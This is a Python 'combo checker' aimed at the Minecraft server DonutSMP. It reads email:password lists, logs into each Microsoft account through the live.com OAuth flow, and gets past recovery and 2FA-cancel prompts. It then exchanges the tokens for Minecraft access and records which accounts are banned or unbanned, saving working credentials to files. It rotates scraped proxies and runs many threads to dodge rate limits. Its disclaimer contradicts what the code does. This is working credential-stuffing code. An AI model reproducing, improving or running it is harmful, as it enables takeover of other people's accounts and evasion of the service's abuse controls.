import os
import configparser
import requests
import time
import uuid
import json
import re
import concurrent.futures
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style, init
import sys
import threading
import traceback
import random

proxylist = []
proxytype = "'4'"  # Default to proxyless

def getproxy():
    if proxytype == "'5'": return random.choice(proxylist)
    if proxytype != "'4'":
        proxy = random.choice(proxylist)
        if proxytype == "'1'": return {'http': 'http://' + proxy, 'https': 'http://' + proxy}
        elif proxytype == "'2'": return {'http': 'socks4://' + proxy, 'https': 'socks4://' + proxy}
        elif proxytype == "'3'": return {'http': 'socks5://' + proxy, 'https': 'socks5://' + proxy}
    else:
        return None
def log_exception(exc_type, exc_value, exc_tb):
    with open("logs.txt", "a", encoding="utf-8") as log_file:
        traceback.print_exception(exc_type, exc_value, exc_tb, file=log_file)

sys.excepthook = log_exception

if hasattr(threading, "excepthook"):
    def thread_excepthook(args):
        log_exception(args.exc_type, args.exc_value, args.exc_traceback)
    threading.excepthook = thread_excepthook
from colorama import Fore, Style, init
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound
init(autoreset=True)

RESULTS_DIR = "results"

def ensure_results_folder(combo_file):
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)
    folder_name = os.path.splitext(os.path.basename(combo_file))[0]
    folder_path = os.path.join(RESULTS_DIR, folder_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    return folder_path

def save_result(folder, filename, line):
    with open(os.path.join(folder, filename), "a", encoding="utf-8") as f:
        f.write(line + "\n")

def load_config():
    config_path = "config.ini"
    config = configparser.ConfigParser()
    default_settings = {
        "Threads": "10",
        "SaveCapture": "True"
    }
    if not os.path.isfile(config_path):
        config["Settings"] = default_settings
        with open(config_path, "w") as f:
            config.write(f)
    config.read(config_path)
    if "Settings" not in config:
        config["Settings"] = default_settings
    for key, value in default_settings.items():
        if key not in config["Settings"]:
            config["Settings"][key] = value
    with open(config_path, "w") as f:
        config.write(f)
    return config

class Capture:
    def __init__(self, email, password, mc_name, ban_status, ban_reason, time_left, ban_id):
        self.email = email
        self.password = password
        self.mc_name = mc_name
        self.ban_status = ban_status
        self.ban_reason = ban_reason
        self.time_left = time_left
        self.ban_id = ban_id

    def builder(self):
        return (
            f"Email: {self.email}\n"
            f"Password: {self.password}\n"
            f"MC Name: {self.mc_name}\n"
            f"Ban Status: {self.ban_status}\n"
            f"Ban Reason: {self.ban_reason}\n"
            f"Time Left: {self.time_left}\n"
            f"Ban ID: {self.ban_id}\n"
            "============================"
        )

CLIENT_ID = "00000000402b5328"
SCOPE = "service::user.auth.xboxlive.com::MBI_SSL"
REDIRECT_URI = "https://login.live.com/oauth20_desktop.srf"
OAUTH_URL = "https://login.live.com/oauth20_authorize.srf?client_id={}&response_type=token&redirect_uri={}&scope={}&display=touch&locale=en".format(
    CLIENT_ID, REDIRECT_URI, SCOPE
)

def get_urlPost_sFTTag(session):
    for _ in range(5):
        try:
            text = session.get(OAUTH_URL, timeout=15).text
            # Use donut.py's regex for maximum compatibility
            match = re.search(r'value=\\?"(.+?)\\?"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match2 = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match2:
                    return match2.group(1), sFTTag, session
        except Exception:
            pass
        time.sleep(1)
    raise Exception("Failed to get urlPost or sFTTag")

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    # MSMC_Booster.py logic: retry and rotate proxy if needed
    for _ in range(5):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != OAUTH_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
        except Exception:
            proxy = getproxy()
            if proxy:
                session.proxies = proxy if isinstance(proxy, dict) else {'http': proxy, 'https': proxy}
        time.sleep(1)
    return None, session

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    # MSMC_Booster.py logic: retry and handle login edge cases
    for _ in range(5):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            # Success
            if '#' in login_request.url and login_request.url != OAUTH_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            # 2FA or recovery
            elif 'cancel?mkt=' in login_request.text:
                try:
                    ipt = re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group()
                    pprid = re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group()
                    uaid = re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    recovery_data = {'ipt': ipt, 'pprid': pprid, 'uaid': uaid}
                    recovery_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(recovery_url, data=recovery_data, allow_redirects=True)
                    fin_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(fin_url, allow_redirects=True)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, session
                except:
                    pass
            # 2FA, account recovery, or abuse
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return "None", session
            # Bad password, account doesn't exist, etc.
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                return "None", session
        except Exception:
            proxy = getproxy()
            if proxy:
                session.proxies = proxy if isinstance(proxy, dict) else {'http': proxy, 'https': proxy}
        time.sleep(1)
    return None, session

def xbox_authenticate(ms_access_token):
    url = "https://user.auth.xboxlive.com/user/authenticate"
    payload = {
        "Properties": {
            "AuthMethod": "RPS",
            "SiteName": "user.auth.xboxlive.com",
            "RpsTicket": ms_access_token
        },
        "RelyingParty": "http://auth.xboxlive.com",
        "TokenType": "JWT"
    }
    r = requests.post(url, json=payload)
    r.raise_for_status()
    data = r.json()
    xbox_token = data["Token"]
    uhs = data["DisplayClaims"]["xui"][0]["uhs"]
    return xbox_token, uhs

def xbox_xsts(xbox_token):
    url = "https://xsts.auth.xboxlive.com/xsts/authorize"
    payload = {
        "Properties": {
            "SandboxId": "RETAIL",
            "UserTokens": [xbox_token]
        },
        "RelyingParty": "rp://api.minecraftservices.com/",
        "TokenType": "JWT"
    }
    r = requests.post(url, json=payload)
    r.raise_for_status()
    data = r.json()
    xsts_token = data["Token"]
    uhs = data["DisplayClaims"]["xui"][0]["uhs"]
    return xsts_token, uhs

def get_mc_access_token(uhs, xsts_token):
    url = "https://api.minecraftservices.com/authentication/login_with_xbox"
    payload = {
        "identityToken": f"XBL3.0 x={uhs};{xsts_token}"
    }
    r = requests.post(url, json=payload)
    r.raise_for_status()
    return r.json()["access_token"]

def get_mc_profile(mc_access_token):
    url = "https://api.minecraftservices.com/minecraft/profile"
    headers = {"Authorization": f"Bearer {mc_access_token}"}
    r = requests.get(url, headers=headers)
    r.raise_for_status()
    data = r.json()
    return data["name"], data["id"]

def join_donutsmp_bot(mc_name, mc_uuid, mc_token, combo, folder, config):
    result = None
    disconnect_message = None
    email, password = combo.split(":", 1)
    auth_token = AuthenticationToken(username=mc_name, access_token=mc_token, client_token=uuid.uuid4().hex)
    auth_token.profile = Profile(id_=mc_uuid, name=mc_name)
    try:
        connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=393, allowed_versions={393})

        @connection.listener(clientbound.login.DisconnectPacket, early=True)
        def login_disconnect(packet):
            nonlocal result, disconnect_message
            try:
                msg = str(packet.json_data)
            except Exception:
                msg = ""
            disconnect_message = msg
            result = "banned"

        @connection.listener(clientbound.play.JoinGamePacket, early=True)
        def joined_server(packet):
            nonlocal result
            result = "unbanned"

        connection.connect()
        c = 0
        while result is None and c < 1000:
            time.sleep(0.01)
            c += 1

        if result == "unbanned":
            print(Fore.GREEN + f"[UNBANNED] {combo} | Logged in as {mc_name}" + Style.RESET_ALL)
            save_result(folder, "Unbanned.txt", f"{combo} | {mc_name}")
            if config.getboolean("Settings", "SaveCapture"):
                cap = Capture(email, password, mc_name, "unbanned", "", "", "")
                save_result(folder, "Capture.txt", cap.builder())
            time.sleep(1)
        elif result == "banned":
            if disconnect_message:
                clean = re.sub(r'§.', '', disconnect_message)
                reason_match = re.search(r'(You are .+?)(?:\\n|\n)', clean)
                reason = reason_match.group(1).strip() if reason_match else ""
                time_match = re.search(r'Time Left: ([^\n\\]+)', clean)
                time_left = time_match.group(1).strip() if time_match else ""
                banid_match = re.search(r'Ban ID: ([^\n\\]+)', clean)
                ban_id = banid_match.group(1).strip() if banid_match else ""
                fields = [reason, f"Time Left: {time_left}" if time_left else "", f"Ban ID: {ban_id}" if ban_id else ""]
                output = '.'.join([f for f in fields if f])
                print(Fore.RED + f"[BAD] {combo} | Logged in as {mc_name} | Status: {output}" + Style.RESET_ALL)
                save_result(folder, "Banned.txt", f"{combo} | {mc_name} | {output}")
                if config.getboolean("Settings", "SaveCapture"):
                    cap = Capture(email, password, mc_name, "banned", reason, time_left, ban_id)
                    save_result(folder, "Capture.txt", cap.builder())
            else:
                print(Fore.RED + f"[BAD] {combo} | Logged in as {mc_name} | Status: banned" + Style.RESET_ALL)
                save_result(folder, "Banned.txt", f"{combo} | {mc_name} | Status: banned")
        else:
            print(Fore.RED + f"[BAD] {combo} | Status: unknown error" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: unknown error")
        connection.disconnect()
    except Exception as e:
        error_str = str(e)
        # Special handling for too many requests
        if "429" in error_str or "Too Many Requests" in error_str:
            print(Fore.RED + f"[BAD] {combo} | Status: too many Request" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: too many Request")
        else:
            print(Fore.RED + f"[BAD] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: error | {error_str}")
        time.sleep(0.1)

def process_combo(combo, folder, config):
    try:
        email, password = combo.strip().split(":", 1)
        session = requests.Session()
        session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        })
        if proxytype != "'4'":
            proxy = getproxy()
            if proxy:
                session.proxies = proxy if isinstance(proxy, dict) else {'http': proxy, 'https': proxy}
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if not token:
            print(Fore.RED + f"[BAD] {combo} | Status: login_failed" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", combo)
            time.sleep(0.1)
            return
        xbox_token, uhs = xbox_authenticate(token)
        xsts_token, uhs = xbox_xsts(xbox_token)
        mc_access_token = get_mc_access_token(uhs, xsts_token)
        mc_name, mc_uuid = get_mc_profile(mc_access_token)
        join_donutsmp_bot(mc_name, mc_uuid, mc_access_token, combo, folder, config)
    except Exception as e:
        error_str = str(e)
        if "429" in error_str or "Too Many Requests" in error_str:
            print(Fore.YELLOW + f"[TRY LATER ] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"[TRY LATER ] {combo} | Status: error | {error_str}")
        else:
            print(Fore.RED + f"[BAD] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: error | {error_str}")
        time.sleep(0.1)

def load_combos(filename):
    with open(filename, "r", encoding="utf-8") as f:
        combos = [line.strip() for line in f if ":" in line]
    return combos
def load_proxies(proxy_file):
    global proxylist
    proxylist = []
    if not os.path.isfile(proxy_file):
        print(Fore.RED + f"Proxy file not found: {proxy_file}" + Style.RESET_ALL)
        return
    with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            proxy = line.strip()
            if proxy:
                proxylist.append(proxy)
    print(Fore.CYAN + f"Loaded {len(proxylist)} proxies." + Style.RESET_ALL)

def get_proxies():
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt"
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
    ]
    for service in api_http:
        http.extend(requests.get(service).text.splitlines())
    for service in api_socks4:
        socks4.extend(requests.get(service).text.splitlines())
    for service in api_socks5:
        socks5.extend(requests.get(service).text.splitlines())
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    proxylist.clear()
    if proxytype == "'1'":
        for proxy in http: proxylist.append(proxy)
    elif proxytype == "'2'":
        for proxy in socks4: proxylist.append(proxy)
    elif proxytype == "'3'":
        for proxy in socks5: proxylist.append(proxy)
    print(Fore.LIGHTBLUE_EX + f'Scraped [{len(proxylist)}] proxies')

if __name__ == "__main__":
    print(Fore.LIGHTWHITE_EX + Style.BRIGHT + "\n" + "="*90)
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + " " * 20 + ">>>  IMPORTANT NOTICE  <<<".center(50))
    print(Fore.LIGHTWHITE_EX + Style.BRIGHT + "="*90)
    print()
    print(Fore.LIGHTCYAN_EX + " " * 8 + "This tool does NOT check Minecraft account validity.".center(74))
    print(Fore.LIGHTGREEN_EX + " " * 8 + "It ONLY checks if a valid account is banned or unbanned on DonutSMP.".center(74))
    print(Fore.LIGHTCYAN_EX + " " * 8 + "Do NOT use this tool to check Minecraft account combos.".center(74))
    print()
    print(Fore.LIGHTMAGENTA_EX + " " * 8 + "Use responsibly. For best results, use only with valid Minecraft accounts.".center(74))
    print()
    print(Fore.LIGHTWHITE_EX + "="*90)
    print(Fore.LIGHTBLUE_EX + Style.BRIGHT + " " * 28 + "CREDITS: MSMC & @minex00(MineX13)".center(34))
    print(Fore.LIGHTWHITE_EX + "="*90 + Style.RESET_ALL + "\n")
    combo_file = input("Enter combo file path: ").strip()
    print(Fore.GREEN + "=== DonutSMP BAN CHECKER ===" + Style.RESET_ALL)
    combo_file = input("Enter combo file path: ").strip()
    print(Fore.LIGHTBLUE_EX + "Proxy Type: [1] Http/s - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper")
    proxytype = repr(input("Enter proxy type (number): "))
    if proxytype not in ["'1'", "'2'", "'3'", "'4'", "'5'"]:
        print(Fore.RED + "Invalid Proxy Type.")
        exit(1)
    if proxytype != "'4'" and proxytype != "'5'":
        proxy_file = input("Enter proxy file path: ").strip()
        load_proxies(proxy_file)
    if proxytype == "'5'":
        print(Fore.LIGHTGREEN_EX + "Scraping Proxies Please Wait.")
        get_proxies()
    if not os.path.isfile(combo_file):
        print(Fore.RED + "Combo file not found." + Style.RESET_ALL)
        exit(1)
    folder = ensure_results_folder(combo_file)
    config = load_config()
    combos = load_combos(combo_file)
    print(Fore.CYAN + f"Loaded {len(combos)} combos." + Style.RESET_ALL)
    # Recommend thread count based on proxy type
    if proxytype == "'4'":
        print(Fore.LIGHTYELLOW_EX + "Proxyless mode detected. Recommended threads: 1-5 (to avoid rate limits).")
    else:
        print(Fore.LIGHTYELLOW_EX + "Proxy mode detected. Recommended threads: 10-100 (depends on proxy quality).")

    while True:
        try:
            max_threads = int(input(Fore.LIGHTBLUE_EX + "Enter number of threads: " + Style.RESET_ALL))
            if proxytype == "'4'" and not (1 <= max_threads <= 5):
                print(Fore.LIGHTRED_EX + "For proxyless, keep threads between 1 and 5." + Style.RESET_ALL)
            elif proxytype != "'4'" and not (1 <= max_threads <= 100):
                print(Fore.LIGHTRED_EX + "For proxies, keep threads between 10 and 100 (depends on proxy quality)." + Style.RESET_ALL)
            else:
                break
        except ValueError:
            print(Fore.LIGHTRED_EX + "Please enter a valid number." + Style.RESET_ALL)
    from queue import Queue

    combo_queue = Queue()
    for combo in combos:
        combo_queue.put(combo)

    def worker():
        while not combo_queue.empty():
            combo = combo_queue.get()
            process_combo(combo, folder, config)
            combo_queue.task_done()
            time.sleep(1)  # Add 1 second delay between combos

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        for _ in range(max_threads):
            executor.submit(worker)
    combo_queue.join()